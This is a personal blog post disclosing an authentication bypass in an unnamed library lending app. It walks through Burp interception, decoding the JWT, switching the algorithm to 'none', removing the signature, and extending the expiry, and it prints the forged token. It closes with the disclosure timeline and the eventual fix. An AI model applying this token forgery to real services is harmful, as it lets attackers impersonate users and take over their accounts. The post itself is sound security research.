---
layout: post
title: "Authentication bypass in a library lending app"
---

## Overview of the app

On September 3rd 2019 I discovered an authentication bypass vulnerability in a mobile app that facilitates borrowing of digital content for members of participating libraries. The publisher of the app requested I not make reference to the name of either the app or the publisher, so I shall not. Suffice to say, this app appears to be popular amongst libraries both in the UK and further afield.

For members of participating libraries, the process is pretty straigth forward. Download the app, provide your library card number and create an account. This then provides the user access to their library's digital collection, including ebooks, and audiobooks.

## The vulnerability

As a result of mishandling of JWTs, it was possible for an attacker to appear as any user of any library and perform any actions as that user, including borrowing and returning books, viewing loan history, and viewing and changing user account details including email address.

The impact of this vulnerability isn't quite as severe as it would first appear. Despite requiring no username or password to impersonate any given user, it was necessary to know the user's library card number and the library they are a member of, although with no effective rate limiting in place, brute forcing of the library id would be fairly trivial given that the API has an unauthenticated endpoint which lists full details of all libraries in the system.

## Discovery

I found this bug mostly through idle curiosity - I had the evening to myself and something compelled me to figure out how this app worked.

This is a mobile app, making it non-trivial (but also not difficult) to intercept traffic between the app and the server.

I used [Burp Community Edition](https://portswigger.net/), and added a proxy listener for port 8085 to listen on all interfaces. I then configured manual proxy details on my phone, setting the IP address of the proxy to the machine I had Burp running on, and set the port to 8085.

I visited http://burp/ from the phone to download and install the Burp-generated certificate authority as a trusted certificate on the phone, allowing interception of encrypted TLS (https) traffic. It's worth noting that iOS requires a lot of taps through various confirmation screens to do this, as adding a certificate to the trusted store is typically a _very bad idea_.

## How does this thing work?

So at this point I'm intercepting all HTTP traffic flowing between my phone and the internet, and they're appearing in Burp on my laptop.

On opening the app on my phone, requests began appearing in Burp under the HTTP History tab. The first interesting one was to https://example.com/rest/login.

The JSON of the request looked like this:

```
{
 "password": "XXXXXX",
 "site": "6394",
 "deviceInformation": {
  "os": "iOS",
  "manufacturer": "Apple",
  "deviceType": "iPhone",
  "model": "iPhone",
  "osVersion": "12.4.1",
  "screenWidth": 1125,
  "screenHeight": 2436
 },
 "user": "B0035XXXXX"
}
```

And the response from the server:

```
{
 "successful": true,
 "sessionToken": "eyJhbGciOiJIUzUxMiJ9.ewogICJzdWIiOiAiNTdYWFhYWCIsCiAgImV4cCI6IDE1Njc1NDY5MDYsCiAgImlkIjogIjQ0WFhYWFhYWCIsCiAgInNJZCI6ICI2Mzk0IiwKICAiaXNUVSI6IGZhbHNlLAogICJuIjogIkIwMDM1WFhYWFgiCn0.AK3MVfCAPoTvbR2rKWnuXF5nkdvBgwkkcvvQNVfLawTH1vvzt1IPxmgaiWhorWJQgrB0hVsCfdOJm4-zM9a1Kg",
 "firstTimeUser": false,
 "updates": [
  ... some other stuff ...
 ]
}
```

From this we can see that the first thing the app does on launch is to automatically take my login credewntials that are stored on the phone and fire off a request to the API to log me in. And look, it even helpfully says it was successful!

However, the interesting part of the response is the `sessionToken`. The tell-tale start `eyJ` is base64 encoded `{"` - the first sign that this token is probaby a JWT.

The second sign that this is a JWT is, assuming that this is a base64 encoded string, it doesn't end with any `=` padding. The JWT spec states that `=` padding characters should not be included.

The string is also split into three blocks, separated by `.`. This is almost certainly a JWT. I dumped the session token value into [CyberChef](https://gchq.github.io/CyberChef/) with a "From Base64" operation and got the following:

```
{"alg":"HS512"}{
  "sub": "57XXXXX",
  "exp": 1567546906,
  "id": "44XXXXXXX",
  "sId": "6394",
  "isTU": false,
  "n": "B0035XXXXX"
}.+s.| .¡;ÛGjÊZ{...ävð`ÂI.¾ô
UòÚÁ1õ¾üíÔ.ñ..¢Z.+X. ¬.!VÀ.tâfã3=kR 
```

This is definitely a JWT. As I touched on above, a JWT is separated into three different data blocks:

- A JSON block describing the algorithm (HS512 in this case) and token type
- A JSON block carrying the user claims (things the server wants to tell the client about this user)
- And then a final block representing the signature data, decoded into character junk.

Having found the app to be using JWTs for authorisation, this affected how I would approach further investigation. The most common exploit class associated with these types of mobile apps is [insecure direct object reference (IDOR)](https://owasp.org/www-project-cheat-sheets/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html), but on learning that JWTs were in use for auth, I began to suspect it less likely that I would find any trivial vulnerabilities.

There were also a few different claims in this JWT, and it wasn't immediately obvious what these different ids were. I had a new avenue of investigation to explore.

## About that libraries endpoint...

I knew I needed to learn more about the claims presented in the session token. Let's taken another look at them:

- `"sub":  "57XXXXX"`
- `"exp":  1567546906`
- `"id":   "44XXXXXXX"`
- `"sId":  "6394"`
- `"isTU": false`
- `"n":    "B0035XXXXX"`

Some of these claims are "registered" claims, i.e., their meaning and use is defined in the JWT spec so we don't have to try to figure out what the values represent. `sub` is the "principal subject" of the token. In this case, it's a pretty safe bet to presume it's my unique user id in the system. `exp` is the expiration time of the token, represented here in UNIX seconds.

By looking through the app on my phone, I soon found that my library card number is "B0035XXXXX", so I now knew what `n` was. That still left `id`, `sId`, and `isTU`.

`sId` looked interesting, in that it was a much smaller value than the other numbers. The app had made a request to `/rest/libraries`, and on a hunch I search the JSON response body for `6394`:

`{"siteId":"6394","siteName":"My Library Service" ... `

So `sId` is the library I'm registered with. I'm still unclear on what `id` and `isTU` represent, but for the purposes of finding this vulnerability, they're unimportant.

## The Problem With JWT

The advantage for application developers using JWT as session tokens is the lack of requirement for tracking session state server side. Everything required is stored on the client in the JWT.

Instead of maintaining session data on the server and pushing a unique identifier to this state to the client, the need to look up the data on the server is removed altogether by having the client store and relay the relevant session data (the "claims") with each request.

The inherent problem with this approach is that there's nothing to prevent a client from sending back whatever data they want. For example, swapping out the `sub` value for a different user id to attempt to impersonate that user.

Data tampering like this is prevented in JWTs via the signature portion of the response. The first two parts of the JWT (the algorithm/type block, and the claims block) are signed using a secret key stored on the server, and this signature is appended to the JWT as the third block.

When a client makes a request with the JWT, the JWT data is validated on the server against the signature using the secret key. If a client tampers with the claims, the original signature will no longer match the data and the server will reject the token. And because the secret key is required in order to produce a signature, it isn't possible for a client to resign the modified payload.

It is the first block of the JWT (`{"alg":"HS512"}`) that defines the algorithm to use in the signing process on the server. The JWT specification describes the algorithms that JWT software implementations must support. Unfortunately, one of these types is `{"alg":"none"}`, i.e., an unsigned JWT.

A JWT with an algorithm type of `none` doesn't have a signature. In fact, the third block of the JWT, the signature block, can be left off altogher.

Since an unsigned JWT has no protection against data tampering by the client, server implementations **must** check the algorithm type of the JWT received in a client request, and reject the JWT if the algorithm is set to `none`.

As it turned out, this app's API didn't perform this check.

## Testing for and verifying the vulnerability

Testing for this vulnerability is fairly straight forward. For example, take this request generated by the mobile app. The genuine JWT is attached with an HTTP header of `X-Authorization` and preceded with the value `Bearer `.

```
GET /rest/user HTTP/1.1
Host: example.com
X-User-Agent: iTunes/3.4.2-6642 (iOS iPhone10,6; iOS 12.4.1; App)
X-Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.ewogICJzdWIiOiAiNTdYWFhYWCIsCiAgImV4cCI6IDE1Njc1NDY5MDYsCiAgImlkIjogIjQ0WFhYWFhYWCIsCiAgInNJZCI6ICI2Mzk0IiwKICAiaXNUVSI6IGZhbHNlLAogICJuIjogIkIwMDM1WFhYWFgiCn0.AK3MVfCAPoTvbR2rKWnuXF5nkdvBgwkkcvvQNVfLawTH1vvzt1IPxmgaiWhorWJQgrB0hVsCfdOJm4-zM9a1Kg
Connection: close
```

I can then decode this bearer token JWT in this request in CyberChef:

```
{"alg":"HS512"}{
  "sub": "57XXXXX",
  "exp": 1567546906,
  "id": "44XXXXXXX",
  "sId": "6394",
  "isTU": false,
  "n": "B0035XXXXX"
}.+s.| .¡;ÛGjÊZ{...ävð`ÂI.¾ô
UòÚÁ1õ¾üíÔ.ñ..¢Z.+X. ¬.!VÀ.tâfã3=kR 
```

By using CyberChef's "From UNIX Timestamp" operation, I can check when this session token expires:

`1567546906` -> _Tue 3 September 2019 21:41:46 UTC_

Knowing when the token expires, I can then confirm that the server is checking the token expiration. JWTs are typically short lived. The JWTs generated by this particular API had an expiration 10 minutes in the future.

I used Burp's "Repeater" function to send this request again after the expiration time had passed. The server response confirmed that it was checking the expiration timestamp in the JWT:

`{"message":"Session token expired","messageCode":"267"}`

Knowing that the server was checking the expiration, I could attempt to modify the signed JWT to move the expiration date into the future. If I could modify this JWT by tampering with the expiration and have the server accept it as valid, that would confirm the presence of a vulnerability.

The first step, was to modify the algorithm JSON block to have the JWT declare itself as using `none` as the signing algorithm:

```
{"alg":"none"}{
  "sub": "57XXXXX",
  "exp": 1567546906,
  "id": "44XXXXXXX",
  "sId": "6394",
  "isTU": false,
  "n": "B0035XXXXX"
}.+s.| .¡;ÛGjÊZ{...ävð`ÂI.¾ô
UòÚÁ1õ¾üíÔ.ñ..¢Z.+X. ¬.!VÀ.tâfã3=kR 
```

Having changed the algorithm, the signature block was no longer required, so that garbage at the end could be removed entirely:

```
{"alg":"none"}{
  "sub": "57XXXXX",
  "exp": 1567546906,
  "id": "44XXXXXXX",
  "sId": "6394",
  "isTU": false,
  "n": "B0035XXXXX"
}
```

I could then modify the expiration value to move it into the future. Again, using CyberChef, this time the "To UNIX Timestamp" operation. I arbitrarily chose 1st October, which at the time was almost a month in the future:

2019-10-01T00:00:00 -> `1569888000`

And replaced the expiration value:


```
{"alg":"none"}{
  "sub": "57XXXXX",
  "exp": 1569888000,
  "id": "44XXXXXXX",
  "sId": "6394",
  "isTU": false,
  "n": "B0035XXXXX"
}
```

I could then independently encode the algorithm JSON block and claims JSON block back to base64 taking care to remove any trailing `=`, and join them together with `.`:

```
eyJhbGciOiJub25lIn0.ewogICJzdWIiOiAiNTdYWFhYWCIsCiAgImV4cCI6IDE1Njk4ODgwMDAsCiAgImlkIjogIjQ0WFhYWFhYWCIsCiAgInNJZCI6ICI2Mzk0IiwKICAiaXNUVSI6IGZhbHNlLAogICJuIjogIkIwMDM1WFhYWFgiCn0.
```

I could now use Burp Repeater again, replacing the original signed bearer token with the one I constructed. The server should've rejected this JWT because it's unsigned. It didn't.

I received back a valid response, the same as when the original signed JWT was still within its expiration. This confirmed that the service was vulnerable to JWT tampering.

As the JWT encodes all the claims of the requesting client, including the user ID, at this point, it would've been trivial to bypass authentication entirely and appear to the service as any user in the system.

## The long road to resolution

I intially reported the vulnerability on **September 4th 2019** to the app's publisher via the support email address on their website, since there didn't appear to be a more appropriate email account to contact. Radio silence.

I followed up with another email on **Sept 12**, reiterating that I believed this vulnerability to be potentially high impact.

Finally on **Sept 20** I found myself on a call with someone from the publisher and described the nature of the vulnerability. They were pleasant, and instilled a level of confidence that the issue was being taken seriously.

And then I waited.

And waited.

And followed up by email.

More radio silence.

And another couple of emails.

And the ghosting continued. Christmas came and went.

And then, four and a half months later on **January 17th 2020** I received an email from the person I'd spoken to on the phone, reporting that the problem had been fixed.

Not that I didn't believe them, but I did go back and check using the same strategy described above, and now: `{"message":"Invalid Session Token","messageCode":"266"}`

## The experience

Digging around in how existing software works is fun. Sometimes it's more fun than writing new software. I'd gone into this with no expectations about what I would find, and came out with a confirmed, reported, and (eventually) resolved vulnerability. I took care along the way to ensure I was only ever accessing my own data, for example modifying the expiry of my own user claim rather than trying to find another valid user ID.

It was fun. Maybe I'll do it again. I might even end up writing something up again.
